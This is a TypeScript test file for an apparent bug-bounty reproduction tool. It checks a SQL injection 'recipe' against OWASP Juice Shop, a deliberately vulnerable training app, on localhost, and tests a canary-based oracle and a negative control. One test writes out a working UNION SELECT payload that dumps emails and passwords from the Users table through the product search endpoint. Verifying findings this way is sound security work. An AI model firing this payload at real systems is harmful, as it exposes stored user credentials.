import assert from "node:assert/strict";
import { randomBytes } from "node:crypto";
import test from "node:test";

import { getRecipesForTarget } from "./recipes";

const CONFIG = {
  baseUrl: "http://localhost:3000",
  searchPath: "/rest/products/search",
  canaryRegistrationPath: "/api/Users/",
};

function freshCanary(): string {
  return `${randomBytes(12).toString("base64url")}@bountydesk.test`;
}

test("an unrecognized target name gets no recipes", () => {
  assert.deepEqual(getRecipesForTarget({ name: "some-other-target", config: CONFIG }), []);
});

test("a recognized target name with an unrecognized config shape gets no recipes", () => {
  assert.deepEqual(
    getRecipesForTarget({ name: "juice-shop-v17.3.0", config: { searchPath: 1 } }),
    [],
  );
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: null }), []);
  assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: "nope" }), []);
});

test("juice-shop-v17.3.0 returns exactly the one recipe whose oracle is fully provable today", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  assert.deepEqual(
    recipes.map((r) => r.id),
    ["juice-shop-sqli-search"],
  );
});

test("the registration fixture matches decisions.md Q18 exactly", () => {
  const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  for (const recipe of recipes) {
    assert.deepEqual(recipe.fixture.request, {
      method: "POST",
      path: "/api/Users/",
      body: {
        email: "{{canary}}",
        password: "bd-fixture-Only1!",
        passwordRepeat: "bd-fixture-Only1!",
      },
    });
  }
});

test("sqli-search negative control and exploit match decisions.md Q18 exactly", () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });

  assert.deepEqual(sqli.negativeControl, {
    method: "GET",
    path: "/rest/products/search?q=apple",
  });

  // The frozen payload, percent-encoded as a query-string value. Computed independently here
  // (not by calling encodeURIComponent on the same literal the recipe uses) so this test would
  // actually catch a change to either side.
  assert.deepEqual(sqli.exploit, {
    method: "GET",
    path:
      "/rest/products/search?q=qwert'))%20UNION%20SELECT%20id%2Cemail%2Cpassword%2C" +
      "'4'%2C'5'%2C'6'%2C'7'%2C'8'%2C'9'%20FROM%20Users--",
  });
});

test("sqli-search oracle: canary in the injected email field (returned as \"name\") is true", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [
      { id: 1, name: "Apple Juice", description: "Real product, no canary here" },
      { id: 2, name: canary, description: "$2a$hashedpassword" },
    ],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), true);
});

test("sqli-search oracle: canary absent from every row is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: "nothing here" }],
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: canary as a coincidental substring outside the name field is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  // The canary shows up verbatim in the response -- in the injected password column (which the
  // UNION returns under "description", not "name") and in a top-level field entirely outside
  // any row. A substring search over the raw body would wrongly call this reproduced.
  const body = JSON.stringify({
    status: "success",
    data: [{ id: 1, name: "Apple Juice", description: canary }],
    debugNote: canary,
  });

  assert.equal(await sqli.oracleCheck({ status: 200, body }, canary), false);
});

test("sqli-search oracle: a non-JSON body does not throw and is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  assert.equal(await sqli.oracleCheck({ status: 500, body: "<html>not json</html>" }, "canary"), false);
});

test("sqli-search oracle: a JSON error response containing the canary is false", async () => {
  const [sqli] = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
  const canary = freshCanary();
  const body = JSON.stringify({ data: [{ name: canary }] });

  assert.equal(await sqli.oracleCheck({ status: 500, body }, canary), false);
});
